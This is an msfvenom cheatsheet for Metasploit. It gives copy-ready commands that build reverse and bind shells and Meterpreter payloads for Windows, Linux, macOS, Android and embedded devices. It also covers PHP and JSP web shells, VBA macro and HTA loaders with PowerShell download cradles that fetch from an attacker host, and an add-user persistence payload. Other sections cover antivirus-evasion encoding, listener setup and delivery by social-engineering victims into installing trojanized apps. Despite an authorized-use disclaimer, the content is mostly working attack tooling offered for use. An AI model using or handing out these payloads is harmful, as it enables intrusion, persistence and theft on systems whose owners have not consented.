# MSFVenom Cheatsheet — Expanded Reference

**Purpose / Disclaimer**

> This cheatsheet is for _authorized_ penetration testing, red-team exercises, research, and educational use only. Please do **not** use these techniques against systems you do not own or have permission to test. Misuse is illegal and unethical.

---

## Quick reference (reminders)

- `LHOST` — attacker/listener IP.
    
- `LPORT` — attacker/listener port.
    
- `RHOST` — target/remote host IP (used for bind payloads).
    
- `-p <payload>` — payload name. Use `msfvenom -l payloads` to list.
    
- `-f <format>` — output format (exe, elf, apk, macho, war, raw, asp, php, jsp, python, ruby, etc.).
    
- `-o <file>` — write to file (clearer than `>`).
    
- `-b "<badchars>"` — bytes to avoid.
    
- `-e <encoder> -i <count>` — use encoder and iterations (obfuscation only).
    
- `--list-options` — shows payload options (e.g., LHOST, LPORT, URIPATH, SRVHOST, SRVPORT).
    

---

## How to confirm exact payload names

Always run:

```bash
msfvenom -l payloads | grep <platform-or-feature>
msfvenom -p <payload> --list-options
```

Payload names and available variants can change between Metasploit versions.

---

## Basic msfvenom usage patterns

- List available payloads:
    

```bash
msfvenom -l payloads
```

- List options for a specific payload:
    

```bash
msfvenom -p <PAYLOAD> --list-options
```

- Common flags:
    
    - `-p <payload>` — payload name (required).
        
    - `-f <format>` — output format (exe, elf, raw, macho, asp, jsp, war, php, python, perl, etc.).
        
    - `-o <file>` — write to file (preferred over shell redirection).
        
    - `-e <encoder>` — use encoder (e.g., `x86/shikata_ga_nai`).
        
    - `-i <count>` — number of encoding iterations.
        
    - `-b "<badchars>"` — avoid bytes (e.g. `\x00\x0a`).
        
    - `-a <arch>` — architecture (x86, x64).
        
    - `--platform <platform>` — platform hint (Windows, Linux, OSX, Java, PHP).
        
    - `EXITFUNC=` — how the shell exits (`process`, `thread`, `seh`).
        

---

## Organized Payload Examples

> All commands below assume you replace placeholders (`<IP>`, `<PORT>`, `<USER>`, `<PASS>`) before running.

### Linux (ELF / x86 / x64)

|Command|Purpose|Notes|
|---|--:|---|
|`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf`|Linux Meterpreter — reverse (x86)|Multi-stage|
|`msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf -o shell.elf`|Linux Meterpreter — bind (x86)|Multi-stage|
|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf`|Linux reverse shell (x64)|Single-stage|

### Windows (EXE / Meterpreter / CMD)

|Command|Purpose|Notes|
|---|--:|---|
|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe`|Windows Meterpreter reverse|Multi-stage|
|`msfvenom -p windows/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f exe -o shell.exe`|Windows Meterpreter bind|Multi-stage|
|`msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe`|Windows CMD reverse shell|Single-stage|
|`msfvenom -p windows/adduser USER=<USER> PASS=<PASS> -f exe -o add_user.exe`|Create local user|Useful for post-exploit persistence|

### macOS (Mach-O)

|Command|Purpose|
|---|--:|
|`msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho -o shell.macho`|macOS reverse shell|
|`msfvenom -p osx/x86/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f macho -o shell.macho`|macOS bind shell|

### Web / Script payloads (PHP, ASP, JSP, WAR)

|Command|Purpose|Notes|
|---|--:|---|
|`msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.php`|PHP Meterpreter web shell|Paste/upload to PHP-enabled server|
|`msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw -o phpreverseshell.php`|PHP reverse shell||
|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.jsp`|JSP reverse shell|Can also output WAR with `-f war`|
|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp -o shell.asp`|ASP Meterpreter shell|For classic ASP sites|

### Scripting languages (raw)

|Command|Purpose|
|---|--:|
|`msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw -o shell.py`|Python reverse shell|
|`msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw -o shell.sh`|Bash reverse shell|
|`msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw -o shell.pl`|Perl reverse shell|

---

## Encoding, Bad chars & Obfuscation

- Avoid bad bytes with `-b`, for example:
    

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -b "\x00\x0a\x0d"
```

- Use encoders (no guarantee against modern AV):
    

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -e x86/shikata_ga_nai -i 5
```

- **Note:** Encoders like `shikata_ga_nai` only obfuscate — modern EDR/AV often detect encoded payloads. Consider custom stagers, signed binaries, or living-off-the-land techniques for advanced red teams (legal usage only).
    

---

## Advanced flags & examples

- Using architecture & platform:
    

```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="calc.exe" -f exe -o calc.exe
```

- Complex command example (Nishang Powershell download executed in Python wrapper):
    

```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX (New-Object Net.WebClient).DownloadString('http://<IP>/nishang.ps1')\"" -f python -o nishang_loader.py
```

Break long commands across lines when documenting for readability.

---

## Listener / MultiHandler setup (Metasploit)

1. Start `msfconsole`:
    

```bash
msfconsole
```

2. Configure handler:
    

```bash
use exploit/multi/handler
set payload <payload/name>            # e.g. windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
set ExitOnSession false               # keeps handler running for multiple sessions
exploit -j                            # run as job (background)
```

3. View jobs/sessions:
    

```bash
jobs
sessions -l
sessions -i <id>
```

---

## Practical tips & best practices

- Prefer `-o filename` for direct output instead of `> filename` (clearer and cross-platform).
    
- Test payloads in an isolated lab VM before using them in engagements.
    
- Use `--list-options` to see required and optional parameters for payloads.
    
- Keep Metasploit and msfvenom updated (`msfupdate` or distro package manager).
    
- Consider payload size and shelltype — web upload forms may restrict file size or content.
    
- Use HTTPS for hosted stagers and verify listener reachability (NAT/port forwarding) before deployment.
    
- Document every action when performing authorized testing.
    

---

## Additional payload families (expanded coverage)

> Replace placeholders (e.g., `<IP>`, `<PORT>`, `<APP_NAME>`) before running.

### HTTP / HTTPS Stagers (HTTP(S) staged payloads)

- **Windows Meterpreter — staged over HTTP**
    

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=<IP> LPORT=<PORT> -f exe -o meter_http.exe
```

- **Windows Meterpreter — staged over HTTPS**
    

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f exe -o meter_https.exe
```

- **Linux / Generic HTTP stager (if available)**
    

```bash
msfvenom -p linux/x86/meterpreter/reverse_http LHOST=<IP> LPORT=<PORT> -f elf -o meter_http.elf
```

**Notes:**

- HTTP(S) stagers often require handler setup with `exploit/multi/handler` and `set payload` to the same HTTP(S) payload.
    
- HTTPS helps with egress filtering and network inspection bypass (if certs/trust allowed).
    

---

### Stageless / Single-stage payloads (less handler complexity)

- **Windows (stageless) — generic example**
    

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell_x64.exe
```

- **Linux (stageless)**
    

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell_x64.elf
```

**Notes:** Stageless is simpler but larger and sometimes easier for AV/EDR to detect.

---

### Android (APK / Meterpreter / Shell)

- **Android Meterpreter (reverse TCP):**
    

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o android_meter.apk
```

- **Android Reverse Shell (generic):**
    

```bash
msfvenom -p android/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -o android_shell.apk
```

**Delivery:** upload to device, sideload, or social-engineer victim to install. Be aware of Play Protect and Android OS protections.

---

### iOS / macOS (Intel + Apple Silicon / arm64)

- **macOS x64 (Mach-O):**
    

```bash
msfvenom -p osx/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho -o mac_shell.macho
```

- **macOS arm64 (Apple Silicon)**  
    Some payloads for `osx/arm64` exist — check `msfvenom -l payloads` and use:
    

```bash
msfvenom -p osx/arm64/<payload> LHOST=<IP> LPORT=<PORT> -f macho -o mac_arm_shell.macho
```

**Notes:** macOS Gatekeeper, notarization, and SIP may interfere — test in lab environments.

---

### IoT / Embedded architectures (ARM, ARMLE, MIPS, MIPSEL)

- **Linux ARM (little-endian) meterpreter:**
    

```bash
msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o arm_meter.elf
```

- **MIPS (big/little endian) shell**
    

```bash
msfvenom -p linux/mipsbe/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o mipsbe_shell.elf
msfvenom -p linux/mipsel/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o mipsel_shell.elf
```

**Notes:** Ensure the target CPU/ABI matches (uClibc vs glibc, endianness). Many embedded devices run stripped-down environments.

---

### Containers / Docker

Containers run Linux (various arches) — use Linux payloads appropriate for container architecture.

- **Linux x64 container shell (example):**
    

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o container_shell.elf
```

- **Create a malicious Docker image** by embedding the generated binary in the image and running it. (Test in an isolated environment.)
    

**Note:** Containers often run with limited capabilities; persistence and privilege elevation vary.

---

### Cloud / Java / WAR / EAR

Use Java web payloads to target application servers.

- **JSP reverse shell**
    

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.jsp
```

- **WAR (Java web application payload)**
    

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war
```

**Delivery:** upload to vulnerable Java web apps, exploit deserialization, or deploy to app servers.

---

### Office macros & document delivery

Metasploit can generate payloads focusable for macro or script delivery; often combined with social engineering.

- **Windows PowerShell downloader (VBA macro)**:
    

```bash
msfvenom -p windows/exec CMD="powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://<IP>/payload.ps1')" -f vba -o macro.vba
```

- **Embed a meterpreter stager in a macro or an HTA**: generate an HTA or VBS payload:
    

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f vbs -o meter.vbs
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o meter.hta
```

**Notes & Safety:** Office macros are highly flagged by modern AV/EDR and email gateways. Use only in authorized engagements and test delivery chains.

---

### Cloud-native / Containers: Kubernetes & Serverless

msfvenom emits binaries — for cloud-native attacks, your delivery often pivots through existing images or artifacts. Examples are bespoke and require environment-specific tactics (image injection, CI compromise).

---

### Misc language-specific payloads (embedding into scripts)

- **Python wrapper**:
    

```bash
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw -o shell.py
```

- **Ruby wrapper**:
    

```bash
msfvenom -p cmd/unix/reverse_ruby LHOST=<IP> LPORT=<PORT> -f raw -o shell.rb
```

- **Perl wrapper**:
    

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw -o shell.pl
```

---

## How to choose which payload

- **Network constraints:** If only HTTP(S) allowed, use HTTP(S) staged payloads.
    
- **Size limits:** For small upload surfaces, prefer staged stagers or scriptable one-liners.
    
- **Detection risk:** Staged Meterpreter often more stealthy initially than large stageless shells, but AV signatures evolve quickly.
    
- **Target architecture & OS:** Always confirm with `uname -a`, `file`, or metadata what architecture the target uses (x86, x64, arm, mips, etc.).
    

---

## Examples — copy-ready (more variants)

**Windows Meterpreter Reverse HTTPS (x64):**

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.0.5 LPORT=8443 -f exe -o meter_https_x64.exe
```

**Android Meterpreter Reverse TCP:**

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o trojan_app.apk
```

**Linux ARMLE Meterpreter:**

```bash
msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o arm_meter.elf
```

**JSP Web Shell:**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.jsp
```

**Macro / HTA loader example:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f hta-psh -o loader.hta
```

---

## Handler tips for new payload types

- Match the payload exactly in the handler: if you generated `windows/meterpreter/reverse_https`, `use exploit/multi/handler` then `set payload windows/meterpreter/reverse_https`.
    
- When using HTTP(S) stagers, consider `set SRVHOST`/`SRVPORT` if using `exploit/multi/handler` with web delivery options.
    

---

## Final best practices & resources

- Always confirm payload names/variants with `msfvenom -l payloads`.
    
- Test payloads in isolated labs and VMs using the target platform/ABI.
    
- Log and document every action during authorized engagements for reporting and remediation.
    
- Keep Metasploit and msfvenom updated to ensure compatibility and the latest payload options.
    

---

